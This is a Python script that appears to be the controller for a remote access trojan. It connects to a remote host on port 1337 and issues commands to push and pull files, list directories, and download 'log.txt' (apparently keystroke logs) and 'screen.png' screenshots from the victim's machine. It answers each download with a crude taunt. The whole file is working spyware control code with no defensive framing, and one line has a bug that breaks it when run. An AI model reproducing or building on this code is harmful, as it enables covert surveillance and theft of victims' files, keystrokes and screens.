import socket
import sys
import time

path = ""
def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "192.168.43.211"
    port = 1337

    try:
        soc.connect((host, port))
    except:
        print("Connection error")
        sys.exit()

    print("Enter 'quit' to exit")
    while True:  
        message = input("Enter command -> ")
        soc.send(message.encode('utf-8'))
    
        if message == "push":
            send(input('Filename -> '), soc)
        if message == "pull":
            fname = input('Filename -> ')
            load_file(soc, fname)
            time.sleep(3)
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((host, port))
        if message == 'ls':
            print(soc.recv(5000).decode('utf-8'))
        if message == 'cd' & len(message) > 3:
            pass
        if message == 'dir':
            pass
        if message == 'logs':
            load_data_from_user(soc, "log.txt")
            time.sleep(3)
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((host, port))
        
        if message == "sc":
            load_data_from_user(soc, "screen.png")
            time.sleep(3)
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((host, port))
    soc.send('-'.encode('utf-8'))
    soc.send(b'--quit--')

def ls(soc):
    soc.recv(5012)


def load_file(c, fname):
    print("Receiving...")
    c.send(fname.encode('utf-8'))
    #l = c.recv(1024)
    f = open(fname,'wb')
    l = c.recv(1024)
    while (l):
        print("Receiving...")
        f.write(l)
        l = c.recv(1024)
    f.close()
    print("Done Receiving")

    #c.shutdown(socket.SHUT_WR)
def load_data_from_user(c, fname):
    print("Receiving...")
    #c.send(fname.encode('utf-8'))
    #l = c.recv(1024)
    f = open(fname,'wb')
    l = c.recv(1024)
    while (l):
        print("Receiving...")
        f.write(l)
        l = c.recv(1024)
    f.close()
    print("Done Receiving")
    c.send(b'Thank you for sending nudes')
    #c.shutdown(socket.SHUT_WR)

def send(fname, soc):
    f = open(fname,'rb')
    print('Sending...')
    soc.send(fname.encode('utf-8'))
    l = f.read(1024)
    while (l):
        print('Sending...')
        soc.send(l)
        l = f.read(1024)
    f.close()
    print("Done Sending")


if __name__ == "__main__":
    main()